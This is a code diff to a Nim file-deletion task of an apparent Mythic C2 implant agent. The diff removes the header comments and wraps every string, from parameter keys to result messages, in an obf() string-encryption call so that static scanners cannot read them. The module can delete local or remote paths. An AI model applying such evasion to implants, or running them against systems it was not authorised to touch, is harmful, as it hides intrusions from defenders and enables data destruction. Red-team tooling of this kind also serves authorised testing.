@@ -1,16 +1,14 @@
-## Remove file or directory task
-## Deletes files or directories from the filesystem
-
 import std/[json, os, strformat, strutils]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 
 proc rm*(taskId: string, params: JsonNode): JsonNode =
   ## Remove (delete) a file or directory
   try:
     # Parse parameters
-    let pathParam = params["path"].getStr()
-    let host = if params.hasKey("host"): params["host"].getStr() else: ""
+    let pathParam = params[obf("path")].getStr()
+    let host = if params.hasKey(obf("host")): params[obf("host")].getStr() else: ""
     
     # Build UNC path if host is provided
     let path = if host.len > 0:
@@ -27,20 +25,20 @@ proc rm*(taskId: string, params: JsonNode): JsonNode =
     
     # Check if path exists
     if not fileExists(path) and not dirExists(path):
-      return mythicError(taskId, &"Error: Path does not exist: {path}")
+      return mythicError(taskId, obf("Path does not exist: ") & path)
     
     # Determine if it's a file or directory
     if fileExists(path):
       removeFile(path)
-      return mythicSuccess(taskId, &"Successfully removed file: {path}")
+      return mythicSuccess(taskId, obf("Successfully removed file: ") & path)
     elif dirExists(path):
       removeDir(path)
-      return mythicSuccess(taskId, &"Successfully removed directory: {path}")
+      return mythicSuccess(taskId, obf("Successfully removed directory: ") & path)
     else:
-      return mythicError(taskId, &"Error: Unknown path type: {path}")
+      return mythicError(taskId, obf("Error: Unknown path type: ") & path)
       
   except OSError as e:
-    return mythicError(taskId, &"Error removing path: {e.msg}")
+    return mythicError(taskId, obf("Error removing path: ") & e.msg)
   except:
     let e = getCurrentException()
-    return mythicError(taskId, &"Error: {e.msg}")
+    return mythicError(taskId, obf("Error: ") & e.msg)
